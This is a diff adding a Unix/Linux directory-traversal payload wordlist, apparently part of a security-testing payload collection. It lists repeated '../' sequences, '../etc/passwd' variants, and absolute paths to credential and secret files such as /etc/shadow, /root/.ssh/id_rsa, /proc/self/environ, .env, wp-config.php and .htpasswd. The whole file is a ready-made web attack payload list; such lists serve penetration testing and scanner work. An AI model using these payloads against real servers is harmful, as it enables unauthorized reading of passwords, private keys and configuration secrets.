@@ -1,0 +1,52 @@
+# ============================================================
+# Directory Traversal — Unix / Linux
+# ============================================================
+
+# ---- Basic ----
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+
+# ---- Absolute Paths ----
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/os-release
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/cwd
+/proc/self/fd/0
+/proc/version
+/proc/net/tcp
+/root/.ssh/id_rsa
+/root/.bash_history
+/home/user/.ssh/id_rsa
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/www/html/.env
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.htpasswd
+
+# ---- Common Relative Traversal Paths ----
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ---- From Web Root ----
+./etc/passwd
+././etc/passwd
